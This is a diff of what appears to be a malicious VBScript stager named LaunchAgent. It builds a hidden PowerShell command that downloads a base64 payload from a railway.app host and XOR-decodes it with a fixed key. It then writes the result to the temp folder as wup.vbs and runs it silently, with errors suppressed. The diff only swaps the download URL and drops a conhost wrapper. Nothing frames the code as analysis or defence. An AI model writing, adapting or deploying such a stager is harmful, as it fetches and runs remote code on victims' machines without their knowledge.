@@ -31,16 +31,17 @@
     Sub LaunchAgent()
       On Error Resume Next
       Dim shell : Set shell = CreateObject("WScript.Shell")
+
       Dim psCmd
-      psCmd = "conhost.exe --headless cmd.exe /c " & _
-              "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-              """$e=(New-Object Net.WebClient).DownloadString('https://reimagined-octo-computing-machine.up.railway.app/enc.vbs');" & _
+      psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+              """$e=(New-Object Net.WebClient).DownloadString('https://banappeal-production.up.railway.app/enc.vbs');" & _
               "$b=[Convert]::FromBase64String($e);" & _
               "$k=@(0x5A,0x3F,0x88,0x1C);" & _
               "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % 4]};" & _
               "$d=[System.Text.Encoding]::ASCII.GetString($b);" & _
               "Set-Content -Path $env:TEMP\wup.vbs -Value $d;" & _
               "Start-Process wscript.exe -ArgumentList ($env:TEMP+'\wup.vbs') -WindowStyle Hidden"""
+
       shell.Run psCmd, 0, False
     End Sub
   </script>
